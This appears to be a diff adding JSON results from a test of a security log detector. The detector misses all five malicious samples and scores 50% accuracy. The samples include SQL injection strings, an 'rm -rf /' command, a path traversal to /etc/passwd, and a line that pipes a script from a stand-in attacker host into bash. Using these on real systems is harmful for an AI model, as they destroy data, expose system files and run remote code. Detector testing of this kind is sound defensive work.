@@ -1,0 +1,105 @@
+{
+  "summary": {
+    "accuracy": 50.0,
+    "total_tests": 10,
+    "correct": 5,
+    "latency_stats": {
+      "mean_ms": 522.5943765000466,
+      "median_ms": 480.5697804999909,
+      "min_ms": 194.97473000001264,
+      "max_ms": 1186.6026220000094
+    }
+  },
+  "results": [
+    {
+      "log": "ERROR: Database query failed: ' OR 1=1 --",
+      "expected": true,
+      "detected": false,
+      "correct": false,
+      "confidence": 0.0,
+      "latency_ms": 1186.6026220000094,
+      "cached": false
+    },
+    {
+      "log": "WARN: Command executed: rm -rf / --no-preserve-root",
+      "expected": true,
+      "detected": false,
+      "correct": false,
+      "confidence": 0.0,
+      "latency_ms": 194.97473000001264,
+      "cached": false
+    },
+    {
+      "log": "INFO: File access: ../../etc/passwd",
+      "expected": true,
+      "detected": false,
+      "correct": false,
+      "confidence": 0.0,
+      "latency_ms": 657.5809690002643,
+      "cached": false
+    },
+    {
+      "log": "DEBUG: User input: $(curl evil.com/shell.sh | bash)",
+      "expected": true,
+      "detected": false,
+      "correct": false,
+      "confidence": 0.0,
+      "latency_ms": 336.4997490002679,
+      "cached": false
+    },
+    {
+      "log": "ERROR: Failed to process: '; DROP TABLE users; --",
+      "expected": true,
+      "detected": false,
+      "correct": false,
+      "confidence": 0.0,
+      "latency_ms": 521.5630130001045,
+      "cached": false
+    },
+    {
+      "log": "INFO: User logged in successfully",
+      "expected": false,
+      "detected": false,
+      "correct": true,
+      "confidence": 0.0,
+      "latency_ms": 471.91813899962654,
+      "cached": false
+    },
+    {
+      "log": "DEBUG: Processing request from 192.168.1.100",
+      "expected": false,
+      "detected": false,
+      "correct": true,
+      "confidence": 0.0,
+      "latency_ms": 483.218375999968,
+      "cached": false
+    },
+    {
+      "log": "WARN: High memory usage: 85%",
+      "expected": false,
+      "detected": false,
+      "correct": true,
+      "confidence": 0.0,
+      "latency_ms": 374.962190000133,
+      "cached": false
+    },
+    {
+      "log": "ERROR: Connection timeout after 30s",
+      "expected": false,
+      "detected": false,
+      "correct": true,
+      "confidence": 0.0,
+      "latency_ms": 477.9211850000138,
+      "cached": false
+    },
+    {
+      "log": "INFO: Backup completed successfully",
+      "expected": false,
+      "detected": false,
+      "correct": true,
+      "confidence": 0.0,
+      "latency_ms": 520.7027920000655,
+      "cached": false
+    }
+  ]
+}
